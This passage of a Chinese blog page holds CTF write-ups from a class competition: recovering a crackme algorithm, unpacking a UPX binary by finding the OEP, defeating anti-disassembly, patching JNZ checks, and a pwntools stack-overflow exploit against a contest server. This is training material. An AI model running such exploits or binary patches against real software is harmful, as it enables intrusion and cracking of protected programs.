+<p><img src="http://upload-images.jianshu.io/upload_images/8203438-54f391248dac92a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="apk-改之理"><br>使用那个java反编译的按钮，可以找到反编译的代码，也就是关键的算法。如果熟悉安卓开发的话，可以知道main函数就是onCreate函数，而主类一般都是MainActivity或者LoginActivity这些之类的名字…</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/8203438-bf5177302e24af8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="算法.png"></p>
+<p>ok,算法找到了，账号和密码就出来了(具体可以看一下我的cpp文件)…</p>
+<p>如果有非预期解，请联系我，谢谢，因为这是很早写的writeup，可能在flag上面有一些改动但是思想不变，所以无需在意</p>
+<h2 id="UPX脱壳"><a href="#UPX脱壳" class="headerlink" title="UPX脱壳"></a>UPX脱壳</h2><blockquote>
+<p>这还是给班级对抗赛出的题目</p>
+</blockquote>
+<p>所有文件的链接：<a href="http://pan.baidu.com/s/1mioVsRu" target="_blank" rel="external">http://pan.baidu.com/s/1mioVsRu</a> 密码：l99i<br>其实就是用个工具就可以搞定了UPXshell<br>自己先写个程序，超级简单的c文件…（使用的是VC++6.0编译器）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">	char hah[]=&quot;flag&#123;we_love_d0g3&#125;&quot;;</div><div class="line">	printf(&quot;can you find the flag?\n&quot;);</div><div class="line">	getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>然后使用UPXshell加了一个UPX2.03的压缩壳</p>
+<p>所以ida和OD就无法使用搜索字符串来找到flag了。</p>
+<p>目前第一种解题的方法就是使用UPXshell再(脱壳)解压一下，再用OD查看一下,就OK了…（这是因为我自己用这个软件压缩的，所以用这个解压就没有问题，很多时候一些软件的自动脱壳是有问题的，这是非常规解法…）</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/8203438-d52007a5425e193e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="脱壳.png"></p>
+<p>第二种，是常规解法<br>其中一共是有4种解法的</p>
+<ul>
+<li>单步跟踪（需要有耐心）</li>
+<li>ESP定律法</li>
+<li>2次内存镜像法<ul>
+<li>一步直达法<br>支持第一种，因为第一种最简单，而且一定可以找到程序入口点，只是多花点时间…<br>附上一个链接（手脱壳教程）：<a href="http://blog.csdn.net/obuyiseng/article/details/50925774" target="_blank" rel="external">http://blog.csdn.net/obuyiseng/article/details/50925774</a></li>
+</ul>
+</li>
+</ul>
+<p>Ok,开始写第一种解法，单步跟踪法：</p>
+<p>其实我们只要找到OEP，也就是程序的入口点，然后用插件OllydbgDump来脱壳就OK了。</p>
+<p>首先我们必须要清楚程序的入口点，大致在程序的那个地方，我们可以通过m这个键，来找到我们的代码段。</p>
+<blockquote>
+<p>小贴士：程序一般都有四个区段:- .text - .data - .rdata - .rsrc</p>
+</blockquote>
+<p><img src="http://upload-images.jianshu.io/upload_images/8203438-a39ac706505ad188.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="memory.png"></p>
+<p>小甲鱼的逆向脱壳视频中对于分析如何知道程序入口点有详细的解释，而且这个UPX的壳是一个特例，他的代码段被压缩到了UPX0和UPX1之间（通过多次测试总结出来的），也就是代表我们大致只要发现jmp 00401000~00428000之间就是程序的OEP了。<br>单步跟踪，一步一步，终于发现了这一段：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/8203438-61dbc89d1de3d833.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="big-jump"></p>
+<p>同时也请仔细观察一下上面：popad。</p>
+<blockquote>
+<p>当我们发现有出栈popad的时候，并且紧跟着一个大的跳转的时候，那么要调到的位置一般就是OEP的位置</p>
+</blockquote>
+<p>下面是跳转之后的进入的主函数：<br><img src="http://upload-images.jianshu.io/upload_images/8203438-bb6c0c3776ef087f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="main.png"></p>
+<p>所以发现了oep，那就开始用OllydbgDump脱壳了。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/8203438-e330bd23a5227061.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="process.png"><br>但是输出的程序却崩了，报错内容是0xc0000005<br>这个情况只出现在我的电脑上面，别人的电脑上脱壳都没有问题。但是这并不影响我们用ida反编译查看字符串（因为ida只要找到程序的入口点就能开始对程序反编译），最后就可以找到flag。（你懂的，就是反序了一下…）</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/8203438-3fae82af07717d4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flag.png"></p>
+<p>因为很早写的writeup,后面对题目做了一些修改，所以flag有一些改动，无需在意……</p>
+<h2 id="OMG"><a href="#OMG" class="headerlink" title="OMG"></a>OMG</h2><p>1.填写flag的程序<br><img src="image/图片6.png" alt="图片6.png"></p>
+<p>2.main函数无法反编译<br><img src="image/图片5.png" alt="图片5.png"></p>
+<p>3.在string windows 中找到字符“Plz input your flag:\n”<br><img src="image/图片7.png" alt="图片7.png"></p>
+<p>4.可以进入主函数，可以看到红框<br>add esp,5<br>dec sep * 5 破坏了栈的操作使IDA反汇编不出来，蓝框为判断函数<br><img src="image/图片8.png" alt="图片8.png"></p>
+<p>5.进入函数后可以看到scanf函数后进行判断<br><img src="image/图片9.png" alt="图片9.png"></p>
+<p>6.确定字符长度为25，解码下面的循环以及判断的值结果为<br>D0g3{I_Lv_NieR_Automata!}</p>
+<h2 id="Little-Gift"><a href="#Little-Gift" class="headerlink" title="Little Gift"></a>Little Gift</h2><p>1.打开程序看到有输入框猜测有GetDlgItemText<br><img src="image/图片1.png" alt="图片1.png"></p>
+<p>2.在函数调用列表中找到GetDlgItemText并设置断点，在让程序运行至此<br><img src="image/图片2.png" alt="图片2.png"></p>
+<p>3.看到2个wcscmp函数，并将函数直接比较进入下面的“You got it”MessageBox<br><img src="image/图片3.png" alt="图片3.png"></p>
+<p>4.直接将2个JNZ nop掉，就可以得到最后的flag了<br><img src="image/图片4.png" alt="图片4.png"></p>
+<h2 id="Easy-pwn"><a href="#Easy-pwn" class="headerlink" title="Easy_pwn"></a>Easy_pwn</h2><p>很明显的栈溢出，主函数的逻辑也很简单，溢出点在read函数上：<br><img src="image/34105266.png" alt="34105266.png"></p>
+<p>在ida里搜字符串能看到flag.txt，跟进去，得到l打开flag.txt的函数地址。<br><img src="image/36927495.png" alt="36927495.png"></p>
+<p> 将返回地址覆盖成这个函数地址就好了，下面是exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</div><div class="line"></div><div class="line">sh = remote(<span class="string">'222.18.158.244'</span>, <span class="number">2333</span>)</div><div class="line"><span class="comment">#sh = process('./pwnfun')</span></div><div class="line"></div><div class="line">junk = <span class="string">'a'</span> * <span class="number">0x88</span></div><div class="line">fp = <span class="number">0x0000000000400620</span></div><div class="line"></div><div class="line">payload = junk + p64(fp)</div><div class="line"></div><div class="line">sh.recvuntil(<span class="string">"message:\n"</span>)</div><div class="line">sh.send(payload)</div><div class="line"></div><div class="line"><span class="keyword">print</span> sh.recvall()</div></pre></td></tr></table></figure></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/11/26/班级对抗赛_Re_WriteUp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-sql第三题write-up" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
